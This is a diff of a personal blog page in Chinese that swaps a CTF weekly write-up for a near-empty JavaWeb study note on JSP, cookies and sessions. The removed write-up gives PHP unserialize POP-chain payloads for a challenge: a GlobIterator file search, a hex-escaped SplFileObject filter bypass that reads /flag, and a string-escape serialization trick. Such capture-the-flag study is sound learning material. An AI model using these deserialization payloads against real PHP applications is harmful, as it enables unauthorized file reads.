@@ -16,22 +16,22 @@
   <meta name="author" content="David Penn">
   <meta name="keywords" content="Blog">
   
-    <meta name="description" content="Web一、POP1、prize_p5（16进制绕过&#x2F;字符串逃逸）本题可以从$_GET[‘cata’]，开始构架POP链，同时要绕过下面的正则匹配。其中下面这个语句可以直接使用php的原生类， 1echo new $this-&gt;class($this-&gt;data);  然后我们首先要知道flag位置，查找有f的文件 1O:9:&quot;catalogue&quot;:2:&amp;#123;s">
+    <meta name="description" content="JavaWeb_2六、JSP1、先导入最先的需要的Maven库和其依赖2、七、Cookie和Session1、Cookie2、Session">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF周报-Week10-23Q2">
-<meta property="og:url" content="https://penndavid.github.io/2023/04/28/CTF-Week10/index.html">
+<meta property="og:title" content="JavaWeb基础2">
+<meta property="og:url" content="https://penndavid.github.io/2023/05/16/JavaWeb_2/index.html">
 <meta property="og:site_name" content="DavidPenn 的博客">
-<meta property="og:description" content="Web一、POP1、prize_p5（16进制绕过&#x2F;字符串逃逸）本题可以从$_GET[‘cata’]，开始构架POP链，同时要绕过下面的正则匹配。其中下面这个语句可以直接使用php的原生类， 1echo new $this-&gt;class($this-&gt;data);  然后我们首先要知道flag位置，查找有f的文件 1O:9:&quot;catalogue&quot;:2:&amp;#123;s">
+<meta property="og:description" content="JavaWeb_2六、JSP1、先导入最先的需要的Maven库和其依赖2、七、Cookie和Session1、Cookie2、Session">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-04-28T02:37:08.000Z">
-<meta property="article:modified_time" content="2023-04-28T03:00:31.304Z">
+<meta property="article:published_time" content="2023-05-16T02:18:00.000Z">
+<meta property="article:modified_time" content="2023-05-16T02:18:43.319Z">
 <meta property="article:author" content="David Penn">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JavaWeb">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>CTF周报-Week10-23Q2 - DavidPenn 的博客</title>
+  <title>JavaWeb基础2 - DavidPenn 的博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF周报-Week10-23Q2"></span>
+            <span id="subtitle" data-typed-text="JavaWeb基础2"></span>
           
         </div>
 
@@ -208,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-28 10:37" pubdate>
-          2023年4月28日 上午
+        <time datetime="2023-05-16 10:18" pubdate>
+          2023年5月16日 上午
         </time>
       </span>
     
@@ -220,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          70 字
         
       </span>
     
@@ -231,7 +231,7 @@
         
         
         
-          10 分钟
+          1 分钟
         
       </span>
     
@@ -269,26 +269,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CTF周报-Week10-23Q2</h1>
+            <h1 style="display: none">JavaWeb基础2</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、POP"><a href="#一、POP" class="headerlink" title="一、POP"></a>一、POP</h2><h3 id="1、prize-p5（16进制绕过-字符串逃逸）"><a href="#1、prize-p5（16进制绕过-字符串逃逸）" class="headerlink" title="1、prize_p5（16进制绕过/字符串逃逸）"></a>1、prize_p5（16进制绕过/字符串逃逸）</h3><p>本题可以从$_GET[‘cata’]，开始构架POP链，同时要绕过下面的正则匹配。其中下面这个语句可以直接使用php的原生类，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br></code></pre></td></tr></table></figure>
-
-<p>然后我们首先要知道flag位置，查找有f的文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;GlobIterator&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;/*f*&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>看到了就叫flag</p>
-<p>由于后面有过滤object，但是可以使用原生类SplFileObject，来获取flag，看了一下方法，需要使用16进制绕过去</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?cata=O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;S:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;SplFile\4fbject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>还可以使用字符串逃逸</p>
-<p>原理：1、定义一个abscond方法，就是进行替换的，这个方法本没有错，错的是，可以替换成不同的长度；2、这里举个列，假如我们传进去的是NSSaaa，那么他经过转换就直接接收了hacker，然后aaa就逃出去了；3、然后他对email参数转进来的东西，进行了过滤，所以我们不能用，因为我们要传flag，然后就是phone,if(is_array($escape[‘phone’]))这里判断他必须是一个数组，所以我们要改，最后就是在name中传</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br> <br><span class="hljs-comment">//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br><span class="hljs-comment">//&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
-
-
+                <h1 id="JavaWeb-2"><a href="#JavaWeb-2" class="headerlink" title="JavaWeb_2"></a>JavaWeb_2</h1><h2 id="六、JSP"><a href="#六、JSP" class="headerlink" title="六、JSP"></a>六、JSP</h2><h3 id="1、先导入最先的需要的Maven库和其依赖"><a href="#1、先导入最先的需要的Maven库和其依赖" class="headerlink" title="1、先导入最先的需要的Maven库和其依赖"></a>1、先导入最先的需要的Maven库和其依赖</h3><h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><h2 id="七、Cookie和Session"><a href="#七、Cookie和Session" class="headerlink" title="七、Cookie和Session"></a>七、Cookie和Session</h2><h3 id="1、Cookie"><a href="#1、Cookie" class="headerlink" title="1、Cookie"></a>1、Cookie</h3><h3 id="2、Session"><a href="#2、Session" class="headerlink" title="2、Session"></a>2、Session</h3>
                 
               </div>
             
@@ -306,12 +292,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
   
   
     <span>></span>
     
-  <a href="/categories/CTF/Web/" class="category-chain-item">Web</a>
+  <a href="/categories/Java/JavaWeb/" class="category-chain-item">JavaWeb</a>
   
   
 
@@ -328,7 +314,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF/">#CTF</a>
+        <a href="/tags/JavaWeb/">#JavaWeb</a>
       
     </div>
   
@@ -340,8 +326,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF周报-Week10-23Q2</div>
-      <div>https://penndavid.github.io/2023/04/28/CTF-Week10/</div>
+      <div>JavaWeb基础2</div>
+      <div>https://penndavid.github.io/2023/05/16/JavaWeb_2/</div>
     </div>
     <div class="license-meta">
       
@@ -353,7 +339,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年4月28日</div>
+          <div>2023年5月16日</div>
         </div>
       
       
@@ -385,18 +371,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/05/02/Java-Web-Start/" title="Java Web 学习">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Java Web 学习</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/27/CleanRoomProject/" title="寝室打扫卫生查人系统">
-                        <span class="hidden-mobile">寝室打扫卫生查人系统</span>
+                      <a href="/2023/05/16/JavaWeb_1/" title="JavaWeb基础1">
+                        <span class="hidden-mobile">JavaWeb基础1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
